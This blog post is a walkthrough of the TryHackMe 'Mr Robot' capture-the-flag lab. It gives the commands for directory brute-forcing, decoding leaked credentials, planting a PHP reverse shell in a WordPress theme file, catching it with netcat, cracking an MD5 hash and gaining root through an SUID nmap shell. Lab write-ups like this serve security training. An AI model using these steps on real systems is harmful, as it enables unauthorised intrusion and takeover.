---
layout: post
section-type: post
has-comments: true
title: Try Hack Me - Mr Robot
category: tech
tags: ["tutorial"]
---

### Reconnaissance and Initial Steps
---
#### Nmap Results

```
sudo nmap -Pn -A 10.10.242.39
```


![image](https://github.com/user-attachments/assets/de811a40-544a-4d62-bafd-f03e64b11c4d)

Port scans revealed that ports 80 and 443 were open, indicating that HTTP and HTTPS services were running on these ports, respectively.

![image](https://github.com/user-attachments/assets/add084e3-351a-4e2a-89a7-c2a17e62f267)

Upon inspecting the source code, nothing useful was found. In addition to searching for the source code, the examination of the `robots.txt` file, which is used by search engine crawlers to determine which files are allowed for parsing, was carried out.

### First Flag
---

![image](https://github.com/user-attachments/assets/654b72d0-0600-4270-b67f-8c484d9fcb98)

We now have two files: one is a text file containing the first key, and the other is a dictionary file.


### Second Flag
---

Let's download the dictionary file and use it to perform a directory brute-force attack.
```
wget 10.10.144.37/fsocity.dic
```

```
gobuster dir -u http://10.10.144.37/ -w fsocity.dic
```

![image](https://github.com/user-attachments/assets/d634c8d3-b4d0-42ca-9bfc-eb29b404486b)


While brute-forcing the directories using the dictionary file, we discovered some interesting files. One of them was `license`. Upon accessing the `license` directory, we found a Base64-encoded value in the source code.

![image](https://github.com/user-attachments/assets/5310dbf4-f758-498f-92b0-10b39767c68d)

After decoding the Base64 string, we uncovered the username and password for login.

```
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
```
![image](https://github.com/user-attachments/assets/67210e9f-56d4-4a67-8159-8c0f10a94318)

```
elliot:ER28-0652
```
The username and password can be used to log in via the `/login` path, which was identified during the directory brute forcing process.

![image](https://github.com/user-attachments/assets/af2185cb-1545-4870-8c1e-4956588a5b2c)

![image](https://github.com/user-attachments/assets/ada544a9-71ac-4bd6-a2f5-dae38f08ca3d)

Now that we are logged in, let's use the PHP reverse shell from Kali Linux. We can upload it via the Editor in the Appearance menu by editing the `header.php` file. This ensures that whenever the website loads, the `header.php` file gets executed, allowing us to establish a connection back to our machine.

```
sudo updatedb
```

```
locate php-reverse-shell
```

```
cp /usr/share/webshells/php/php-reverse-shell.php .
```

![image](https://github.com/user-attachments/assets/b1622402-ae7b-4184-9ad0-591eaa7ff18d)

![image](https://github.com/user-attachments/assets/721e931d-972e-4525-8332-5a77c6f892a9)

![image](https://github.com/user-attachments/assets/51a7d4a4-042d-4386-a62d-1c0a817b0111)

![image](https://github.com/user-attachments/assets/0a5f9734-0b18-4d24-9560-eb1a67df13ca)


By listening on port `9001`, we successfully gained a connection when navigating to `/blog`, a page accessible only to the admin.

```
nc -nlvp 9001
```

![image](https://github.com/user-attachments/assets/3f7082ae-e5c5-414c-bb09-ed8107edc378)

After spawning `/bin/bash` using Python, I executed `ls -la` to list the files in the directory. It was revealed that we were logged in as the user daemon. However, the key file was only readable by the user `robot`. Another file, named password.raw-md5, contained an MD5 hash value.

```
python -c 'import pty;pty.spawn("/bin/bash");'
```
![image](https://github.com/user-attachments/assets/a7d99a16-7623-4745-a46e-24975db52f00)

![image](https://github.com/user-attachments/assets/7a0392b3-9374-43e0-9881-dab7781be9ab)

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Upon cracking the MD5 hash using CrackStation, the password for the `robot` user was discovered.

![image](https://github.com/user-attachments/assets/13599298-b649-4ad0-8fb0-6f86ddf448a8)

```
abcdefghijklmnopqrstuvwxyz
```
After switching the user and using the discovered password, we successfully logged in as `robot`. 

![image](https://github.com/user-attachments/assets/6e76fe37-69e4-4099-bd29-f73b35a2186d)

Now that we have access as `robot`, we can read the key file, revealing the second flag.


### Privilege Escalation & Third Flag
---

```
sudo -l
```
Upon checking the user's privileges with `sudo -l`, it was identified that the user `robot` is not in the sudo group, meaning it doesn't have administrative privileges by default. This indicates that we will need to find another way to escalate privileges to gain root access.

![image](https://github.com/user-attachments/assets/3034c35a-de33-4a8f-9082-05f15f148105)


```
find / -perm -u=s -type f 2>/dev/null
```

By searching for SUID binaries, we discovered that nmap has the SUID bit set. This means nmap can be run with elevated privileges, even by a non-privileged user. We can potentially exploit this to escalate our privileges to root by using nmap's interactive mode to execute shell commands.

![image](https://github.com/user-attachments/assets/4b3d0431-1737-46d7-b863-c3eaa5c512bf)

Privilege escalation can be achieved by running the following commands:

1. Start nmap in interactive mode with:

```
nmap --interactive
```

2. Once in interactive mode, execute a shell with:

```
!sh
```

This grants root access, allowing us to further explore the system and complete the final steps of the CTF.

![image](https://github.com/user-attachments/assets/31174e70-dbd5-480b-a3ec-751bc2f6c5d7)

